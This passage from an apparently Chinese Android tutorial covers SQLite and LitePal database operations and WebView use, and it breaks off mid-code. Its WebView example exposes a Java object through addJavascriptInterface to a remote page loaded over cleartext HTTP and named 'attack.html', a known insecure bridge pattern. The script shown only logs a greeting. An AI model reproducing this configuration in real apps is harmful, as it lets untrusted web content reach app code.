&#125;</span><br></pre></td></tr></table></figure><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>query：七个参数，返回一个Cursor对象，数据在对象中</p><ul><li>参数一：表名</li><li>参数二：指定查询哪几列，不指定则默认所有列</li><li>第三 四个参数：约束查询某一行或某几行的数据，不知道默认所有行</li><li>参数五：指定需要去group by的列，不指定则不对查询结果group by</li><li>参数六：对group by后的数据进一步过滤</li><li>参数七：指定查询结果的排列方式</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> dbHelper.getWritableDatabase();</span><br><span class="line">                <span class="comment">// 查询Book表中所有的数据</span></span><br><span class="line">                <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.query(<span class="string">&quot;Book&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="comment">// 遍历Cursor对象，取出数据并打印</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">                        <span class="type">String</span> <span class="variable">author</span> <span class="operator">=</span> cursor.getString(cursor.getColumnIndex(<span class="string">&quot;author&quot;</span>));</span><br><span class="line">                        <span class="type">int</span> <span class="variable">pages</span> <span class="operator">=</span> cursor.getInt(cursor.getColumnIndex(<span class="string">&quot;pages&quot;</span>));</span><br><span class="line">                        <span class="type">double</span> <span class="variable">price</span> <span class="operator">=</span> cursor.getDouble(cursor.getColumnIndex(<span class="string">&quot;price&quot;</span>));</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span> + name);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span> + author);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span> + pages);</span><br><span class="line">                        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span> + price);</span><br><span class="line">                    &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">                &#125;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="使用SQL操作数据库"><a href="#使用SQL操作数据库" class="headerlink" title="使用SQL操作数据库"></a>使用SQL操作数据库</h4><ul><li><p>添加数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.execSQL(&quot;<span class="keyword">insert</span> <span class="keyword">into</span> Book (name, author, pages, price) <span class="keyword">values</span>(?, ?, ?, ?)<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            new String[] &#123; &quot;</span>The Da Vinci Code<span class="string">&quot;, &quot;</span>Dan Brown<span class="string">&quot;, &quot;</span><span class="number">454</span><span class="string">&quot;, &quot;</span><span class="number">16.96</span><span class="string">&quot; &#125;);</span></span><br><span class="line"><span class="string">db.execSQL(&quot;</span><span class="keyword">insert</span> <span class="keyword">into</span> Book (name, author, pages, price) <span class="keyword">values</span>(?, ?, ?, ?)<span class="string">&quot;,</span></span><br><span class="line"><span class="string">            new String[] &#123; &quot;</span>The Lost Symbol<span class="string">&quot;, &quot;</span>Dan Brown<span class="string">&quot;, &quot;</span><span class="number">510</span><span class="string">&quot;, &quot;</span><span class="number">19.95</span><span class="string">&quot; &#125;);</span></span><br></pre></td></tr></table></figure></li><li><p>更新数据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="built_in">execSQL</span>(<span class="string">&quot;update Book set price = ? where name = ?&quot;</span>, <span class="keyword">new</span> <span class="type">String</span>[] &#123; <span class="string">&quot;10.99&quot;</span>, <span class="string">&quot;The Da Vinci Code&quot;</span> &#125;);</span><br></pre></td></tr></table></figure></li><li><p>删除数据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="built_in">execSQL</span>(<span class="string">&quot;delete from Book where pages &gt; ?&quot;</span>, <span class="keyword">new</span> <span class="type">String</span>[] &#123; <span class="string">&quot;500&quot;</span> &#125;);</span><br></pre></td></tr></table></figure></li><li><p>查询数据</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.rawQuery<span class="punctuation">(</span><span class="string">&quot;select * from Book&quot;</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="LitePal操作数据库"><a href="#LitePal操作数据库" class="headerlink" title="LitePal操作数据库"></a>LitePal操作数据库</h3><h4 id="配置LitePal"><a href="#配置LitePal" class="headerlink" title="配置LitePal"></a>配置LitePal</h4><ol><li><strong>添加LitePal依赖</strong></li></ol><p>编辑<code>app/build.gradle</code>文件，在dependencies闭包中添加如下内容</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    <span class="keyword">compile</span> <span class="keyword">fileTree</span>(dir: <span class="string">&#x27;libs&#x27;</span>, <span class="keyword">include</span>: [<span class="string">&#x27;*.jar&#x27;</span>])</span><br><span class="line">    <span class="keyword">compile</span> <span class="string">&#x27;com.android.support:appcompat-v7:23.2.0&#x27;</span></span><br><span class="line">    testCompile <span class="string">&#x27;junit:junit:4.12&#x27;</span></span><br><span class="line">    <span class="keyword">compile</span> <span class="string">&#x27;org.litepal.android:core:1.4.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.配置litepal.xml文件</strong></p><p>右击<code>app/src/main</code>目录→<code>New</code>→<code>Directory</code>，创建一个<code>assets</code>目录，然后在assets目录下再新建一个litepal.xml文件，接着编辑litepal.xml文件中的内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">&quot;BookStore&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">dbname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;dbname&gt;</code>标签用于指定数据库名</li><li><code>&lt;version&gt;</code> 标签用于指定数据库版本号</li><li><code>&lt;list&gt;</code>标签用于指定所有的映射模型</li></ul><p><strong>3.配置LitePalApplication</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    <span class="keyword">package</span>=<span class="string">&quot;com.example.litepaltest&quot;</span>&gt;</span><br><span class="line">    &lt;application</span><br><span class="line">        android:name=<span class="string">&quot;org.litepal.LitePalApplication&quot;</span></span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;<span class="variable">@mipmap</span>/ic_launcher&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;<span class="variable">@string</span>/app_name&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:theme=<span class="string">&quot;<span class="variable">@style</span>/AppTheme&quot;</span>&gt;</span><br><span class="line">        ...</span><br><span class="line">    &lt;<span class="regexp">/application&gt;</span></span><br><span class="line"><span class="regexp">&lt;/mani</span>fest&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将项目的<code>application</code>配置为<code>org.litepal.LitePalApplication</code>，这样才能让LitePal的所有功能都可以正常工作</p><h4 id="创建和升级数据库"><a href="#创建和升级数据库" class="headerlink" title="创建和升级数据库"></a>创建和升级数据库</h4><p>创建Book类，定义好相关属性（表的列名）</p><p>在<code>litepal.xml</code>的<code>&lt;list&gt;</code>标签内添加<code>&lt;mapping class=&quot;com.example.litepaltest.Book&quot;&gt;&lt;/mapping&gt;</code></p><p><mapping>标签：声明配置的映射模型类，使用完整类名，有多少个映射模型类，就有多少个&lt;mapping 标签</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Book</span> <span class="keyword">extends</span> <span class="title class_">DataSupport</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义属性，即列名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainActivity中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">createDatabase</span> <span class="operator">=</span> (Button) findViewById(R.id.create_database);</span><br><span class="line">        createDatabase.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                </span><br><span class="line">                Connector.getDatabase();</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>Connector.getDatabase();：创建数据库</p><h4 id="添加数据-1"><a href="#添加数据-1" class="headerlink" title="添加数据"></a>添加数据</h4><p>LitePal进行表管理操作时不需要模型类有任何的继承结构，但是进行CRUD操作时就不行了，必须要让 相关表类 继承自DataSupport 类才行，如Book表需要让Book类继承<code>DataSupport</code>类，然后调用<code>.save()</code>方法将数据存入数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">                book.setName(<span class="string">&quot;The Da Vinci Code&quot;</span>);</span><br><span class="line">                book.setAuthor(<span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                book.setPages(<span class="number">454</span>);</span><br><span class="line">                book.setPrice(<span class="number">16.96</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Unknow&quot;</span>);</span><br><span class="line">                book.save();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="更新数据-1"><a href="#更新数据-1" class="headerlink" title="更新数据"></a>更新数据</h4><p>对于LitePal来说，对象是否已存储就是根据调用model.isSaved() 方法的结果来判断的，返回true 就表示已存储，返回false 就表示未存储。</p><p>方法一：对已存储的对象，重新调用<code>.save()</code>方法进行更新</p><p>方法二：更新从数据库中查到的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">                book.setPrice(<span class="number">14.95</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Anchor&quot;</span>);</span><br><span class="line">                book.updateAll(<span class="string">&quot;name = ? and author = ?&quot;</span>, <span class="string">&quot;The Lost Symbol&quot;</span>, <span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>想把一个字段的值更新成默认值时，是不可以使用上面的方式来set 数据的。将为数据更新成默认值的操作，LitePal统一提供了一个setToDefault() 方法，然后传入相应的列名就可以实现了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">book.setToDefault(<span class="string">&quot;pages&quot;</span>);</span><br><span class="line">book.updateAll();</span><br></pre></td></tr></table></figure><h4 id="删除数据-1"><a href="#删除数据-1" class="headerlink" title="删除数据"></a>删除数据</h4><ul><li><p>方法一</p><p>调用过save() 方法的对象，或者是通过LitePal提供的查询API查出来的对象，都是可以直接使用delete() 方法来删除数据的。</p></li><li><p>方法二</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataSupport.deleteAll(Book.class, <span class="string">&quot;price &lt; ?&quot;</span>, <span class="string">&quot;15&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里调用了DataSupport.deleteAll() 方法来删除数据，其中deleteAll() 方法的第一个参数用于指定删除哪张表中的数据，Book.class就意味着删除Book表中的数据，后面的参数用于指定约束条件。</p><h4 id="查询数据-1"><a href="#查询数据-1" class="headerlink" title="查询数据"></a>查询数据</h4><p>findAll：返回Book对象类型的List集合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                List&lt;Book&gt; books = DataSupport.findAll(Book.class);</span><br><span class="line">                <span class="keyword">for</span> (Book book: books) &#123;</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span> + book.getName());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span> + book.getAuthor());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span> + book.getPages());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span> + book.getPrice());</span><br><span class="line">                    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book press is &quot;</span> + book.getPress());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h2 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p><strong>本地加载</strong></p><p>布局文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;WebView</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/web_view&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">         /&gt;</span><br></pre></td></tr></table></figure><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> findViewById(web_view);</span><br><span class="line">        webview.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webview.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">        webview.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                view.loadUrl(url);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>清单文件允许联网</p><p><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</code></p>  <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line"><span class="string">...</span></span><br><span class="line">android<span class="function">:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line">&lt;<span class="string">/application</span>&gt;</span><br></pre></td></tr></table></figure><p>  <strong>远程加载</strong></p><p>通过一个js脚本调用java中的代码</p><p>js内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line"><span class="comment">//参数1：Javascript对象名</span></span><br><span class="line"><span class="comment">//参数2：Java对象名</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 加载JS代码</span></span><br><span class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Android调用js</strong></p><p>js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(<span class="string">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Android调用JS方法测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 